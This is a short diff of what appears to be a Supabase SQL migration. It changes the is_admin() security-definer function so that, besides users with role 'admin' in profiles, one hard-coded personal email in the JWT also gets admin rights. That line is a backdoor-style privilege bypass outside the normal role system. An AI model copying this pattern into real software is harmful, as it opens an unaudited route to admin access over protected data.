@@ -51,9 +51,10 @@ ALTER TABLE betting_notifications ENABLE ROW LEVEL SECURITY;
 CREATE OR REPLACE FUNCTION is_admin() 
 RETURNS boolean AS $$
 BEGIN
-  RETURN EXISTS (
-    SELECT 1 FROM profiles 
-    WHERE id = auth.uid() AND role = 'admin'
+  RETURN (
+    EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin')
+    OR 
+    (auth.jwt() ->> 'email' = 'marcotamby@gmail.com')
   );
 END;
 $$ LANGUAGE plpgsql SECURITY DEFINER;
